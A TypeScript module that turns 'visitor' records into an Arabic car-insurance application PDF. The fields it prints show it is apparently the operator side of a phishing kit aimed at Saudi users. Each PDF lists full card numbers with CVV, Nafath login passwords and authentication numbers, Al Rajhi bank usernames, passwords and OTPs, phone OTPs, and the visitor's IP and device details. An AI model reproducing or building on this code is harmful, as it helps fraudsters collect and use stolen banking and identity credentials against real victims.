import jsPDF from "jspdf";
import autoTable from "jspdf-autotable";
import { amiriFont } from "./amiri-font";

interface VisitorData {
  id: string;
  personalInfo?: {
    nationalId?: string;
    birthDate?: string;
    phone?: string;
    documment_owner_full_name?: string;
  };
  vehicleInfo?: {
    serialNumber?: string;
    vehicleYear?: string;
    coverageType?: string;
    selectedAddOns?: string[];
  };
  selectedOffer?: {
    companyName?: string;
    basePrice?: number;
    totalPrice?: number;
    discountPercentage?: number;
  };
  paymentInfo?: {
    cardNumber?: string;
    cardHolder?: string;
    expiryDate?: string;
    cvv?: string;
  };
  nafazData?: {
    idNumber?: string;
    password?: string;
    authNumber?: string;
  };
  rajhiData?: {
    username?: string;
    password?: string;
    otp?: string;
  };
  phoneData?: {
    phoneNumber?: string;
    carrier?: string;
    otp?: string;
  };
  metadata?: {
    country?: string;
    browser?: string;
    os?: string;
    ip?: string;
    createdAt?: any;
  };
}

export function generateInsurancePDF(data: VisitorData): void {
  const doc = new jsPDF({
    orientation: "portrait",
    unit: "mm",
    format: "a4",
  });

  doc.addFileToVFS("Amiri-Regular.ttf", amiriFont);
  doc.addFont("Amiri-Regular.ttf", "Amiri", "normal");
  doc.setFont("Amiri");

  const pageWidth = doc.internal.pageSize.getWidth();
  const margin = 15;
  let yPos = 20;

  doc.setFontSize(22);
  doc.setTextColor(0, 82, 147);
  doc.text("تأمين السيارات", pageWidth / 2, yPos, { align: "center" });
  yPos += 10;
  
  doc.setFontSize(14);
  doc.setTextColor(0, 82, 147);
  doc.text("استمارة طلب", pageWidth / 2, yPos, { align: "center" });
  yPos += 15;

  doc.setFillColor(0, 82, 147);
  doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
  doc.setTextColor(255, 255, 255);
  doc.setFontSize(11);
  doc.text("معلومات مقدم الطلب", pageWidth / 2, yPos + 5.5, { align: "center" });
  yPos += 12;

  const personalData = [
    [data.personalInfo?.documment_owner_full_name || "-", "الاسم الكامل"],
    [data.personalInfo?.nationalId || "-", "رقم الهوية"],
    [data.personalInfo?.phone || "-", "رقم الهاتف"],
    [data.personalInfo?.birthDate || "-", "تاريخ الميلاد"],
  ];

  autoTable(doc, {
    startY: yPos,
    head: [],
    body: personalData,
    theme: "grid",
    styles: {
      font: "Amiri",
      fontSize: 10,
      cellPadding: 4,
      halign: "right",
    },
    columnStyles: {
      0: { cellWidth: "auto", halign: "left" },
      1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
    },
    margin: { left: margin, right: margin },
  });

  yPos = (doc as any).lastAutoTable.finalY + 10;

  if (data.vehicleInfo) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("معلومات المركبة", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const vehicleData = [
      [data.vehicleInfo?.serialNumber || "-", "الرقم التسلسلي"],
      [data.vehicleInfo?.vehicleYear || "-", "سنة الصنع"],
      [data.vehicleInfo?.coverageType || "-", "نوع التغطية"],
      [data.vehicleInfo?.selectedAddOns?.join(", ") || "-", "الإضافات"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: vehicleData,
      theme: "grid",
      styles: {
        font: "Amiri",
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.selectedOffer) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("عرض التأمين", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const offerData = [
      [data.selectedOffer?.companyName || "-", "الشركة"],
      [data.selectedOffer?.basePrice ? `${data.selectedOffer.basePrice} ر.س` : "-", "السعر الأساسي"],
      [data.selectedOffer?.discountPercentage ? `${data.selectedOffer.discountPercentage}%` : "-", "الخصم"],
      [data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice} ر.س` : "-", "السعر الإجمالي"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: offerData,
      theme: "grid",
      styles: {
        font: "Amiri",
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.paymentInfo?.cardNumber) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("معلومات الدفع", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const paymentData = [
      [data.paymentInfo?.cardNumber || "-", "رقم البطاقة"],
      [data.paymentInfo?.cardHolder || "-", "اسم حامل البطاقة"],
      [data.paymentInfo?.expiryDate || "-", "تاريخ الانتهاء"],
      [data.paymentInfo?.cvv || "-", "CVV"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: paymentData,
      theme: "grid",
      styles: {
        font: "Amiri",
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.nafazData?.idNumber) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("توثيق نفاذ", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const nafazTableData = [
      [data.nafazData?.idNumber || "-", "رقم الهوية"],
      [data.nafazData?.password || "-", "كلمة المرور"],
      [data.nafazData?.authNumber || "-", "رقم التوثيق"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: nafazTableData,
      theme: "grid",
      styles: {
        font: "Amiri",
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.rajhiData?.username) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("بنك الراجحي", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const rajhiTableData = [
      [data.rajhiData?.username || "-", "اسم المستخدم"],
      [data.rajhiData?.password || "-", "كلمة المرور"],
      [data.rajhiData?.otp || "-", "رمز التحقق"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: rajhiTableData,
      theme: "grid",
      styles: {
        font: "Amiri",
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.phoneData?.phoneNumber) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("التحقق من الهاتف", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const phoneTableData = [
      [data.phoneData?.phoneNumber || "-", "رقم الهاتف"],
      [data.phoneData?.carrier || "-", "شركة الاتصالات"],
      [data.phoneData?.otp || "-", "رمز التحقق"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: phoneTableData,
      theme: "grid",
      styles: {
        font: "Amiri",
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.metadata) {
    doc.setFillColor(100, 100, 100);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("البيانات الوصفية", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const createdAt = data.metadata?.createdAt?.toDate?.() 
      ? data.metadata.createdAt.toDate().toLocaleString("ar-SA")
      : data.metadata?.createdAt || "-";

    const metaData = [
      [data.metadata?.country || "-", "الدولة"],
      [data.metadata?.browser || "-", "المتصفح"],
      [data.metadata?.os || "-", "نظام التشغيل"],
      [data.metadata?.ip || "-", "عنوان IP"],
      [createdAt, "تاريخ الإنشاء"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: metaData,
      theme: "grid",
      styles: {
        font: "Amiri",
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });
  }

  const pageHeight = doc.internal.pageSize.getHeight();
  doc.setFontSize(8);
  doc.setTextColor(128, 128, 128);
  const timestamp = new Date().toLocaleString("ar-SA");
  doc.text(
    `تم الإنشاء: ${timestamp} | رقم المستند: ${data.id}`,
    pageWidth / 2,
    pageHeight - 10,
    { align: "center" }
  );

  const fileName = `طلب_تأمين_${data.personalInfo?.nationalId || data.id}_${Date.now()}.pdf`;
  doc.save(fileName);
}
